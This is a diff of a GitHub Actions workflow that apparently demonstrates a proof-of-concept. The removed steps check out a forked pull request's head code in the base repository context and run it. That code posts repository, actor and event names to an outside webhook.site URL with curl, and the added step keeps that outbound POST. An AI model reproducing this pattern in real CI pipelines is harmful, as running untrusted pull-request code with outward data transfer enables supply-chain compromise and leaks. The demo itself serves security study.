@@ -8,22 +8,8 @@ jobs:
   demo:
     runs-on: ubuntu-latest
     steps:
-      - name: Show context
+      - name: Ping webhook.site
         run: |
-          echo "Running in base repo context!"
-          echo "Repository: $GITHUB_REPOSITORY"
-          echo "Event: $GITHUB_EVENT_NAME"
-          echo "Actor: $GITHUB_ACTOR"
-
-      # Checkout PR HEAD (⚠️ unsafe in real-world, but for PoC demo)
-      - name: Checkout PR head
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-
-      - name: Run PR code (attacker controlled)
-        run: |
-          echo "This comes from the forked PR branch!"
-          echo "Repo=$GITHUB_REPOSITORY Event=$GITHUB_EVENT_NAME Actor=$GITHUB_ACTOR" \
-            | curl -X POST -H "Content-Type: text/plain" \
-              -d @- https://webhook.site/b057826d-9b04-4ae9-a137-0f8a0cd24dc9
+          echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME" \
+          | curl -v -X POST -H "Content-Type: text/plain" \
+            -d @- https://webhook.site/b057826d-9b04-4ae9-a137-0f8a0cd24dc9
